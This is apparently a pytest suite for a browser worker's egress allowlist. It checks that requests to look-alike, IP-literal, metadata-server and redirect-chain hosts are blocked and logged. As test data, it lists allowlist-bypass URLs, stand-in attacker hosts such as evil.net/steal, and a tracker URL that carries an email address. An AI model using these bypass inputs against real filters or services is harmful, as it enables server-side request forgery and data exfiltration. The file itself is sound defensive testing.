"""SEC-09 (PRD 16.4: "Egress allowlist for browsers" -> "Blocked-host test"; PRD 16.2 "Exfiltration through links or
browsing: egress allowlist; no data in query strings; blocked requests logged"; PRD 12.3 / FR-CON-07 "Requests to
non-allowlisted hosts are blocked and logged").

Acceptance claim, proved end to end through `BrowserWorker` (the HandsProvider a run uses) and `EgressPolicy` (the one
gate the browser engine must call before every request): a request to a host that is not on the allowlist, or that
only LOOKS like one, is refused, logged, and NEVER SENT; a request to an allowlisted host goes through (positive
control, so a policy that blocks everything cannot pass).

Every way a worker can make the browser send a request, enumerated from `tilo_browser.worker` and the driver protocol
in services/browser/tests/API.md, is exercised below: top-level navigation, each redirect hop, subresources of a page,
and a click's navigation. `BrowserWorker.navigate` is the only public method that takes a URL (asserted below, so a new
URL-taking method fails this file until it is gated and tested). `upload_file` and `download_file` act on an element
ref of an already-gated page; any request a driver makes for them must pass the same gate by the driver contract, and
the engine seam that enforces it is the fake engine of `_browser_lib` (no real browser engine exists in the repo yet).

Look-alikes covered: subdomain and prefix tricks, suffix tricks, userinfo (`allowed@evil`, `evil@allowed`), IP
literals in every encoding including the cloud metadata address, IDN homographs, percent-encoded and backslash hosts,
whitespace, wrong scheme, a redirect or sub-request to a blocked host, and an HTTPS-to-HTTP downgrade.

"Never sent" is observed twice: on the fake web's request log, and on real loopback listeners that count TCP
connections (so a blocked host's server sees zero connections, not merely zero requests). Nothing leaves 127.0.0.1.

Defaults (chosen by FR-CON-07, PRD 12.3 being silent): a bare entry matches that host only; `*.parent` matches below
`parent` but not `parent`; ports are not part of the rule; userinfo and IP literals are always blocked; an empty
allowlist blocks everything. A blocked-egress event type is not registered yet (services/browser/tests/API.md), so
"logged" means `EgressPolicy.blocked`, the list the caller turns into an event or alert.
"""

from __future__ import annotations

import http.client
import http.server
import inspect
import socket
import threading
from urllib.parse import urlsplit

import pytest
from _browser_lib import EMAIL, FakeEngine, FakeWeb, Page, button, doc, fake_secrets
from hypothesis import given, settings
from hypothesis import strategies as st

ALLOW = ["example.com", "*.cdn.example.org"]
EXACT, PARENT = "example.com", "cdn.example.org"


@pytest.fixture(autouse=True)
def _loopback_only(monkeypatch: pytest.MonkeyPatch):
    """Nothing in this file may leave 127.0.0.0/8: a policy bug must fail the test, not reach the network."""
    real_connect = socket.socket.connect

    def connect(self: socket.socket, address, *args, **kwargs):
        host = address[0] if isinstance(address, tuple) else str(address)
        if host not in ("127.0.0.1", "::1", "localhost"):
            raise OSError(f"blocked by the SEC-09 test guard: {host}")
        return real_connect(self, address, *args, **kwargs)

    monkeypatch.setattr(socket.socket, "connect", connect)


def _blocked(rig, url: str) -> None:
    from tilo_browser.egress import EgressBlocked

    with pytest.raises(EgressBlocked) as info:
        rig.worker.navigate(url)
    assert info.value.decision.allowed is False


# ---------------------------------------------------------------------------------------------------------------
# Positive control


def test_SEC_09_allowlisted_hosts_are_fetched_and_not_logged_as_blocked(make_rig):
    rig = make_rig(allow=ALLOW)
    rig.web.add(f"https://{EXACT}/", title="Home", text="Hello")
    rig.web.add(f"https://img.{PARENT}/a.png", title="Image")

    rig.worker.navigate(f"https://{EXACT}/")
    rig.worker.navigate(f"https://img.{PARENT}/a.png")

    assert [r.url for r in rig.web.requests] == [f"https://{EXACT}/", f"https://img.{PARENT}/a.png"]
    assert rig.policy.blocked == []
    assert all(d.allowed and d.reason == "allowed" for d in rig.policy.decisions)


# ---------------------------------------------------------------------------------------------------------------
# The blocked-host test


def test_SEC_09_navigation_to_a_non_allowlisted_host_is_blocked_logged_and_never_sent(make_rig):
    rig = make_rig(allow=ALLOW)

    _blocked(rig, "https://evil.net/landing")

    assert rig.web.requests == [] and rig.driver.sent == []
    (decision,) = rig.policy.blocked
    assert (decision.allowed, decision.reason, decision.host) == (False, "host_not_allowlisted", "evil.net")
    assert decision.scheme == "https"


LOOKALIKES = [
    # subdomain / prefix / suffix tricks
    "https://example.com.evil.net/",
    "https://www.example.com/",
    "https://evil-example.com/",
    "https://notexample.com/",
    "https://xcdn.example.org/",
    "https://cdn.example.org/",  # a wildcard rule never matches its own apex
    "https://example.org/",
    "https://cdn.example.org.evil.net/",
    "https://example.com.cdn.example.org.evil.net/",
    "https://evil.net/example.com",
    "https://evil.net/?next=https://example.com/",
    "https://evil.net/#example.com",
    # userinfo
    "https://example.com@evil.net/",
    "https://example.com:443@evil.net/",
    "https://evil.net@example.com/",
    "https://user:pw@example.com/",
    # IP literals, every encoding, and the cloud metadata server
    "https://127.0.0.1/",
    "https://10.0.0.5:8080/",
    "https://169.254.169.254/latest/meta-data/",
    "https://[::1]/",
    "https://[::ffff:127.0.0.1]/",
    "https://2130706433/",
    "https://0x7f.0.0.1/",
    "https://0177.0.0.1/",
    "https://127.1/",
    # homographs and encodings
    "https://\u0435xample.com/",  # Cyrillic e
    "https://example.com%2eevil.net/",
    "https://exa%6dple.com/",
    "https://example.com%40evil.net/",
    "https://evil.net\\@example.com/",
    "https://example.com\\@evil.net/",
    # whitespace and controls
    "https://exa mple.com/",
    "https://example.com\t.evil.net/",
    "https://example.com\n.evil.net/",
    "https://example.com\x00.evil.net/",
    # schemes
    "http://example.com/",
    "ftp://example.com/",
    "file:///etc/passwd",
    "javascript:alert(1)",
    "data:text/html,hello",
    "blob:https://example.com/0f8fad5b-d9cb-469f-a165-70867728950e",
    "wss://example.com/socket",
    # malformed
    "",
    "example.com",
    "//example.com/x",
    "https://",
    "https:///example.com",
    "https://example.com:99999/",
]


@pytest.mark.parametrize("url", LOOKALIKES, ids=[repr(u)[:48] for u in LOOKALIKES])
def test_SEC_09_look_alike_hosts_are_blocked_logged_once_and_never_sent(make_rig, url):
    rig = make_rig(allow=ALLOW)

    _blocked(rig, url)

    assert rig.web.requests == [] and rig.driver.sent == [], "the request must not leave the worker"
    assert len(rig.policy.blocked) == 1 and rig.policy.blocked[0] is rig.policy.decisions[0]
    assert rig.policy.blocked[0].reason in {
        "host_not_allowlisted",
        "ip_literal",
        "scheme_not_allowed",
        "invalid_url",
    }


def test_SEC_09_a_host_the_browser_normalises_to_an_allowlisted_one_is_judged_as_that_host(make_rig):
    """UTS 46 drops a zero-width space and folds case, as browsers do: the URL really loads example.com, and the
    policy says so (the decision names the normalised host), so the gate and the browser never disagree."""
    rig = make_rig(allow=ALLOW)
    rig.web.add("https://exa\u200bmple.com/", title="Home")

    rig.worker.navigate("https://exa\u200bmple.com/")

    (decision,) = rig.policy.decisions
    assert decision.allowed and decision.host == EXACT
    assert rig.policy.blocked == []


def test_SEC_09_an_empty_allowlist_blocks_every_host(make_rig):
    rig = make_rig(allow=[])

    _blocked(rig, f"https://{EXACT}/")

    assert rig.web.requests == []


def test_SEC_09_the_gate_handed_to_the_browser_engine_is_the_egress_policy(make_rig):
    rig = make_rig(allow=ALLOW)

    assert rig.driver.gate(f"https://{EXACT}/") is True
    assert rig.driver.gate("https://evil.net/") is False
    assert [d.host for d in rig.policy.blocked] == ["evil.net"], "a gate refusal is logged by the policy"


# -- redirects ---------------------------------------------------------------------------------------------------

REDIRECT_TARGETS = [
    "https://evil.net/steal",
    "https://example.com.evil.net/steal",
    "https://169.254.169.254/latest/meta-data/",
    "https://127.0.0.1/admin",
    "https://example.com@evil.net/",
    "http://example.com/insecure",  # downgrade
]


@pytest.mark.parametrize("target", REDIRECT_TARGETS)
def test_SEC_09_a_redirect_from_an_allowlisted_host_to_a_blocked_one_is_not_followed(make_rig, target):
    rig = make_rig(allow=ALLOW)
    rig.web.add(f"https://{EXACT}/go", redirect_to=target)

    _blocked(rig, f"https://{EXACT}/go")

    assert [r.url for r in rig.web.requests] == [f"https://{EXACT}/go"], "only the allowlisted first hop was sent"
    (decision,) = rig.policy.blocked
    assert decision.redirect_from is not None and decision.redirect_from.startswith(f"https://{EXACT}/go")


def test_SEC_09_every_hop_of_a_redirect_chain_is_checked_and_the_chain_stops_at_the_first_blocked_hop(make_rig):
    rig = make_rig(allow=ALLOW)
    rig.web.add(f"https://{EXACT}/a", redirect_to=f"https://img.{PARENT}/b")
    rig.web.add(f"https://img.{PARENT}/b", redirect_to=f"https://img.{PARENT}.evil.net/c")
    rig.web.add(f"https://img.{PARENT}.evil.net/c", redirect_to=f"https://{EXACT}/never")

    _blocked(rig, f"https://{EXACT}/a")

    assert [r.url for r in rig.web.requests] == [f"https://{EXACT}/a", f"https://img.{PARENT}/b"]
    assert [d.host for d in rig.policy.blocked] == [f"img.{PARENT}.evil.net"]


def test_SEC_09_a_redirect_that_stays_on_the_allowlist_is_followed(make_rig):
    rig = make_rig(allow=ALLOW)
    rig.web.add(f"https://{EXACT}/old", redirect_to=f"https://{EXACT}/new")
    rig.web.add(f"https://{EXACT}/new", title="New")

    out = rig.worker.navigate(f"https://{EXACT}/old")

    assert out["url"].startswith(f"https://{EXACT}/new")
    assert rig.policy.blocked == []


# -- subresources and clicks -------------------------------------------------------------------------------------


def test_SEC_09_blocked_subresources_are_never_sent_and_are_logged_while_the_page_still_loads(make_rig):
    rig = make_rig(allow=ALLOW)
    rig.web.add(
        f"https://{EXACT}/shop",
        title="Shop",
        text="Winter boots",
        subrequests=(
            f"https://static.{PARENT}/app.js",
            f"https://tracker.evil.net/pixel.gif?d={EMAIL}",
            "https://169.254.169.254/latest/meta-data/",
            f"https://{EXACT}/style.css",
        ),
    )

    rig.worker.navigate(f"https://{EXACT}/shop")

    assert [r.url for r in rig.web.requests] == [
        f"https://{EXACT}/shop",
        f"https://static.{PARENT}/app.js",
        f"https://{EXACT}/style.css",
    ]
    assert sorted(d.host for d in rig.policy.blocked) == ["169.254.169.254", "tracker.evil.net"]
    assert EMAIL not in repr(rig.policy.decisions), "no data from a blocked URL's query reaches the log"
    assert "Winter boots" in rig.worker.capture().text


def test_SEC_09_a_click_that_navigates_to_a_blocked_host_is_blocked_logged_and_never_sent(make_rig):
    rig = make_rig(allow=ALLOW)
    rig.web.add(
        f"https://{EXACT}/",
        tree=doc(button("go", "Visit partner"), title="Home"),
        links={"go": "https://partner.evil.net/offer"},
    )
    rig.worker.navigate(f"https://{EXACT}/")
    ref = rig.worker.find_element("#go")["ref"]

    from tilo_browser.egress import EgressBlocked

    with pytest.raises(EgressBlocked):
        rig.worker.click(ref)

    assert [r.url for r in rig.web.requests] == [f"https://{EXACT}/"]
    assert [d.host for d in rig.policy.blocked] == ["partner.evil.net"]


# -- the log -----------------------------------------------------------------------------------------------------


def test_SEC_09_the_blocked_log_names_each_blocked_host_in_order_and_holds_no_secret(make_rig):
    from tilo_browser.egress import EgressBlocked

    s = fake_secrets()
    rig = make_rig(allow=ALLOW)
    attempts = [
        f"https://user:{s['password']}@evil.net/x?token={s['kv_token']}",
        f"https://one.evil.net/p?key={s['api_key']}",
        f"https://two.evil.net/?mail={EMAIL}",
    ]

    for url in attempts:
        with pytest.raises(EgressBlocked) as info:
            rig.worker.navigate(url)
        for secret in (s["password"], s["kv_token"], s["api_key"], EMAIL):
            assert secret not in str(info.value), "an error never carries the blocked URL's secrets"

    assert len(rig.policy.blocked) == 3 and rig.policy.blocked == rig.policy.decisions
    assert [d.host for d in rig.policy.blocked[1:]] == ["one.evil.net", "two.evil.net"]
    dump = repr(rig.policy.decisions)
    for secret in (s["password"], s["kv_token"], s["api_key"], EMAIL):
        assert secret not in dump
    assert rig.web.requests == []


def test_SEC_09_only_navigate_takes_a_url_so_every_url_entry_point_is_covered_by_this_file():
    from tilo_browser.worker import BrowserWorker

    url_like = {"url", "uri", "href", "link", "target", "address", "host", "destination"}
    taking_a_url = {
        name
        for name, member in inspect.getmembers(BrowserWorker, inspect.isfunction)
        if not name.startswith("_") and url_like & set(inspect.signature(member).parameters)
    }

    assert taking_a_url == {"navigate"}, (
        f"{sorted(taking_a_url - {'navigate'})} takes a URL: gate it through EgressPolicy and add its blocked-host "
        "cases to this file"
    )


# ---------------------------------------------------------------------------------------------------------------
# Real sockets: a blocked host's server sees no connection at all


class _Site(http.server.ThreadingHTTPServer):
    """A loopback web server that counts TCP connections and records what it was asked."""

    daemon_threads = True

    def __init__(self, routes: dict[str, tuple[int, str]]) -> None:
        self.routes = routes
        self.connections = 0
        self.requests: list[str] = []
        self._lock = threading.Lock()
        site = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *args) -> None:
                return

            def do_GET(self) -> None:  # noqa: N802
                with site._lock:
                    site.requests.append(self.path)
                status, payload = site.routes.get(self.path, (200, "ok"))
                self.send_response(status)
                if 300 <= status < 400:
                    self.send_header("Location", payload)
                    payload = ""
                body = payload.encode()
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

        super().__init__(("127.0.0.1", 0), Handler)
        threading.Thread(target=self.serve_forever, kwargs={"poll_interval": 0.02}, daemon=True).start()

    def get_request(self):
        with self._lock:
            self.connections += 1
        return super().get_request()

    @property
    def port(self) -> int:
        return self.server_address[1]


class _SocketWeb(FakeWeb):
    """The FakeWeb whose pages come from real loopback servers, one per host name (a resolver of two entries). A host
    with no server is a request to somewhere the test never provided: it fails loudly."""

    def __init__(self, sites: dict[str, _Site]) -> None:
        super().__init__()
        self.sites = sites

    def get(self, url: str) -> Page:
        parts = urlsplit(url)
        site = self.sites.get(parts.hostname or "")
        if site is None:
            raise AssertionError(f"a request was sent to a host with no server: {url}")
        conn = http.client.HTTPConnection("127.0.0.1", site.port, timeout=5)
        try:
            conn.request("GET", parts.path or "/", headers={"Host": parts.hostname or ""})
            response = conn.getresponse()
            body = response.read().decode()
            if 300 <= response.status < 400:
                return Page(redirect_to=response.getheader("Location"))
            return Page(text=body, title=body)
        finally:
            conn.close()


@pytest.fixture()
def sites():
    made: list[_Site] = []

    def make(routes: dict[str, tuple[int, str]] | None = None) -> _Site:
        made.append(_Site(routes or {}))
        return made[-1]

    yield make
    for site in made:
        site.shutdown()
        site.server_close()


def test_SEC_09_a_blocked_host_s_server_sees_no_connection_and_the_allowlisted_one_sees_one(make_rig, sites):
    from tilo_browser.egress import EgressBlocked

    good = sites({"/": (200, "welcome")})
    evil = sites({"/": (200, "attacker page")})
    rig = make_rig(_SocketWeb({EXACT: good, "evil.net": evil, f"{EXACT}.evil.net": evil}), allow=ALLOW)

    rig.worker.navigate(f"https://{EXACT}/")
    for url in ("https://evil.net/", f"https://{EXACT}.evil.net/", f"https://{EXACT}@evil.net/"):
        with pytest.raises(EgressBlocked):
            rig.worker.navigate(url)

    assert good.connections == 1 and good.requests == ["/"]
    assert evil.connections == 0 and evil.requests == [], "a blocked host's server must see no connection at all"
    assert len(rig.policy.blocked) == 3


def test_SEC_09_a_redirect_to_a_blocked_host_never_opens_a_connection_to_it(make_rig, sites):
    from tilo_browser.egress import EgressBlocked

    evil = sites({"/steal": (200, "attacker page")})
    good = sites({"/go": (302, "https://evil.net/steal")})
    rig = make_rig(_SocketWeb({EXACT: good, "evil.net": evil}), allow=ALLOW)

    with pytest.raises(EgressBlocked):
        rig.worker.navigate(f"https://{EXACT}/go")

    assert good.requests == ["/go"]
    assert evil.connections == 0 and evil.requests == []
    assert [d.host for d in rig.policy.blocked] == ["evil.net"]


# ---------------------------------------------------------------------------------------------------------------
# Property: whatever the URL, an allowed decision implies the host really is on the list


_LABEL = st.text(alphabet="abcdefghijklmnopqrstuvwxyz0123456789-", min_size=1, max_size=8)
_HOSTS = st.one_of(
    st.lists(_LABEL, min_size=1, max_size=4).map(".".join),
    _LABEL.map(lambda label: f"{label}.{EXACT}"),
    _LABEL.map(lambda label: f"{label}{EXACT}"),
    _LABEL.map(lambda label: f"{EXACT}.{label}"),
    _LABEL.map(lambda label: f"{label}.{PARENT}"),
    _LABEL.map(lambda label: f"{PARENT}.{label}"),
    st.sampled_from([EXACT, PARENT, f"x.{EXACT}", f"a.b.{PARENT}"]),
)
_DECORATION = st.sampled_from(["", "u@", "u:p@", "\\", "%2e", " ", "\t", "[", "@"])


@settings(max_examples=400, deadline=None)
@given(
    host=_HOSTS,
    decoration=_DECORATION,
    scheme=st.sampled_from(["https", "http", "ftp", "HTTPS"]),
    tail=st.text(max_size=12),
)
def test_SEC_09_property_an_allowed_url_always_names_an_allowlisted_host_and_nothing_else(
    host, decoration, scheme, tail
):
    from tilo_browser.egress import EgressPolicy

    url = f"{scheme}://{decoration}{host}/{tail}"
    decision = EgressPolicy(allow=ALLOW).check(url)

    if decision.allowed:
        parsed = urlsplit(url)
        assert parsed.scheme == "https"
        assert parsed.username is None and parsed.password is None and "@" not in url.split("/", 3)[2]
        assert parsed.hostname == EXACT or (parsed.hostname or "").endswith("." + PARENT)
        assert not any(ch.isspace() or ch in "\\[" for ch in url.split("/", 3)[2])
    else:
        assert decision.reason != "allowed"


@settings(max_examples=100, deadline=None)
@given(label=_LABEL)
def test_SEC_09_property_a_host_off_the_allowlist_is_never_sent(label):
    engine_web = FakeWeb()
    from tilo_browser.egress import EgressBlocked, EgressPolicy
    from tilo_browser.worker import BrowserWorker

    worker = BrowserWorker(FakeEngine(engine_web), EgressPolicy(allow=ALLOW))
    url = f"https://{label}.evil.test/p"

    with pytest.raises(EgressBlocked):
        worker.navigate(url)

    assert engine_web.requests == []
